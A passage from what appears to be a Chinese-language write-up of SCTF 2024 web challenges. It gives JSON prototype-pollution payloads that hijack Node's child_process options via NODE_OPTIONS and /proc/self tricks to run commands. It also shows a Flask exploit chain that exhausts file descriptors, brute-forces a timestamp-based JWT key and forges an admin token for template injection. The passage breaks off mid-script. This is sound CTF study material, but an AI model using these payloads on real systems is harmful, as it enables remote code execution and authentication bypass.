app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/countreport'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> user <span class="token keyword">in</span> Reportcache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    count <span class="token operator">+=</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Reportcache<span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> count <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//查看当前运行用户</span>
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/VanZY_s_T3st"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> command <span class="token operator">=</span> <span class="token string">'whoami'</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> cmd <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span>command <span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  cmd<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>存在<code>Reportcache[user][date] = reportmessage</code>可以原型链污染，那么猜测我们要污染的目标就是<code>const cmd = cp.spawn(command ,[]);</code></p>
<p>搜了一下，有pp2rce：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-lou-dong-childprocess-han-shu">https://book.hacktricks.xyz/v/cn/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-lou-dong-childprocess-han-shu</a></p>
<p>请求体得以json的格式发出去</p>
<p>这里<code>/VanZY_s_T3st</code> 只有俩参数，可以直接污染2号下标，也不会被<code>Object.assign</code>干掉，相当于自由控制<code>options</code></p>
<p>payload：执行的方法好像有挺多，远程测了半天发现有 &#x2F;readflag</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    'user'<span class="token operator">:</span> <span class="token string">"__proto__"</span><span class="token punctuation">,</span>
    'date'<span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>
    <span class="token property">"reportmessage"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token property">"shell"</span><span class="token operator">:</span> <span class="token string">"/proc/self/exe"</span><span class="token punctuation">,</span>
        <span class="token property">"argv0"</span><span class="token operator">:</span> <span class="token string">"console.log(require('child_process').execSync('/readflag').toString())//"</span><span class="token punctuation">,</span>
        <span class="token property">"env"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"--require=/proc/self/cmdline"</span> <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>或者</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"user"</span><span class="token operator">:</span><span class="token string">"__proto__"</span><span class="token punctuation">,</span>
    <span class="token property">"date"</span><span class="token operator">:</span>  <span class="token number">2</span><span class="token punctuation">,</span>
    <span class="token property">"reportmessage"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"shell"</span><span class="token operator">:</span><span class="token string">"/readflag"</span><span class="token punctuation">,</span>
        <span class="token property">"env"</span><span class="token operator">:</span> 
        <span class="token punctuation">&#123;</span>
            <span class="token property">"NODE_DEBUG"</span><span class="token operator">:</span> <span class="token string">"require(\"child_process\").exec(\"env\");process.exit()//"</span><span class="token punctuation">,</span>
            <span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span> <span class="token string">"--require /proc/self/environ"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个执行的命令在shell参数上</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241001012853042.png" alt="image-20241001012853042"></p>
<hr>
<h1 id="ezRender（复现）"><a href="#ezRender（复现）" class="headerlink" title="ezRender（复现）"></a>ezRender（复现）</h1><blockquote>
<p>hint1：<br>ulimit -n &#x3D;2048<br>cat &#x2F;etc&#x2F;timezone : UTC</p>
</blockquote>
<p>本地起环境调试咣咣报错，昏了</p>
<p>先审一下代码</p>
<p>app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span>redirect
<span class="token keyword">from</span> verify <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> User <span class="token keyword">import</span> User
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> waf <span class="token keyword">import</span> waf

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span>static_folder<span class="token operator">=</span><span class="token string">"static"</span><span class="token punctuation">,</span>template_folder<span class="token operator">=</span><span class="token string">"templates"</span><span class="token punctuation">)</span>
user<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    method<span class="token operator">=</span>request<span class="token punctuation">.</span>method
    <span class="token keyword">if</span> method<span class="token operator">==</span><span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> method<span class="token operator">==</span><span class="token string">"POST"</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>
        name <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        pwd <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> name <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pwd <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> user<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">"This name had been registered"</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                user<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> User<span class="token punctuation">(</span>name<span class="token punctuation">,</span> pwd<span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token string">"OK"</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    method<span class="token operator">=</span>request<span class="token punctuation">.</span>method
    <span class="token keyword">if</span> method<span class="token operator">==</span><span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> method<span class="token operator">==</span><span class="token string">"POST"</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>
        name <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        pwd <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> name <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pwd <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> name <span class="token keyword">not</span> <span class="token keyword">in</span> user<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">"This account is not exist"</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> user<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">.</span>pwd <span class="token operator">==</span> pwd<span class="token punctuation">:</span>
                    token<span class="token operator">=</span>generateToken<span class="token punctuation">(</span>user<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span> <span class="token string">"OK"</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">:</span><span class="token string">"Token="</span><span class="token operator">+</span>token<span class="token punctuation">&#125;</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token string">"Wrong password"</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Cookie"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Please login first"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        infor <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span>
        name <span class="token operator">=</span> infor<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span>
        token <span class="token operator">=</span> infor<span class="token punctuation">[</span><span class="token string">"secret"</span><span class="token punctuation">]</span>
        result <span class="token operator">=</span> check<span class="token punctuation">(</span>user<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>

    method<span class="token operator">=</span>request<span class="token punctuation">.</span>method
    <span class="token keyword">if</span> method<span class="token operator">==</span><span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"admin.html"</span><span class="token punctuation">,</span>name<span class="token operator">=</span>name<span class="token punctuation">)</span>
    <span class="token keyword">if</span> method<span class="token operator">==</span><span class="token string">"POST"</span><span class="token punctuation">:</span>
        template <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> result <span class="token operator">!=</span> <span class="token string">"True"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> result<span class="token punctuation">,</span> <span class="token number">401</span>
        <span class="token comment">#just only blackList</span>
        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Hacker Found"</span>
        result<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        <span class="token keyword">if</span> result <span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"OK"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"error"</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/removeUser'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Cookie"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Please login first"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        infor <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span>
        name <span class="token operator">=</span> infor<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span>
        token <span class="token operator">=</span> infor<span class="token punctuation">[</span><span class="token string">"secret"</span><span class="token punctuation">]</span>
        result <span class="token operator">=</span> check<span class="token punctuation">(</span>user<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    <span class="token keyword">if</span> result <span class="token operator">!=</span> <span class="token string">"True"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> result<span class="token punctuation">,</span> <span class="token number">401</span>

    rmuser<span class="token operator">=</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>
    user<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>rmuser<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"Successfully Removed:"</span><span class="token operator">+</span>rmuser

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token comment"># for the safe</span>
    <span class="token keyword">del</span> __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一眼要伪造进 &#x2F;admin 来ssti</p>
<p>找一下token的生成方式</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generateToken</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">:</span>
    secret_key<span class="token operator">=</span>user<span class="token punctuation">.</span>secret
    secret<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span>user<span class="token punctuation">.</span>name<span class="token punctuation">,</span><span class="token string">"is_admin"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span>

    verify_c<span class="token operator">=</span>jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>secret<span class="token punctuation">,</span> secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
    infor<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span>user<span class="token punctuation">.</span>name<span class="token punctuation">,</span><span class="token string">"secret"</span><span class="token punctuation">:</span>verify_c<span class="token punctuation">&#125;</span>
    token<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>infor<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看一下 user.secret 怎么来的</p>
<p>User.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name<span class="token operator">=</span>name
        self<span class="token punctuation">.</span>pwd <span class="token operator">=</span> password
        self<span class="token punctuation">.</span>Registertime<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>handle<span class="token operator">=</span><span class="token boolean">None</span>

        self<span class="token punctuation">.</span>secret<span class="token operator">=</span>self<span class="token punctuation">.</span>setSecret<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">handler</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>handle <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/dev/random"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">setSecret</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        secret <span class="token operator">=</span> self<span class="token punctuation">.</span>Registertime
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>handle <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>handler<span class="token punctuation">(</span><span class="token punctuation">)</span>
            secret <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>handle<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"this file is not exist or be removed"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> secret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>取随机数生成么</p>
<p>注意到这里<code>open(&quot;/dev/random&quot;, &quot;rb&quot;)</code>没close，我们每注册一个用户就会占用一个文件句柄，而这里<code>ulimit -n =2048</code>最多只能开2048个用户，ulimit限制到了之后这个地方就会进 except 报错，secret直接返回时间戳</p>
<p>那么我们尝试burp爆破注册2048个用户</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/register</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">1.95.87.193:36183</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://1.95.87.193:36183/register</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">39</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://1.95.87.193:36183</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token application-json">
<span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"test§1§"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后再注册一个新的用户并登录，此时的key用的就是时间戳了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">import</span> json
<span class="token keyword">import</span> time

<span class="token keyword">import</span> jwt
<span class="token keyword">import</span> requests

key <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>
target <span class="token operator">=</span> <span class="token string">"http://1.95.87.193:36183"</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>target <span class="token operator">+</span> <span class="token string">"/register"</span><span class="token punctuation">,</span>
              json<span class="token operator">=</span><span class="token punctuation">&#123;</span>
                  <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"aaa"</span><span class="token punctuation">,</span>
                  <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123456"</span>
              <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
token <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>target <span class="token operator">+</span> <span class="token string">"/login"</span><span class="token punctuation">,</span>
                      json<span class="token operator">=</span><span class="token punctuation">&#123;</span>
                          <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"aaa"</span><span class="token punctuation">,</span>
                          <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123456"</span>
                      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"Token="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
jwtdata <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"secret"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jwtdata<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
secret <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"aaa"</span><span class="token punctuation">,</span> <span class="token string">"is_admin"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">&#125;</span>
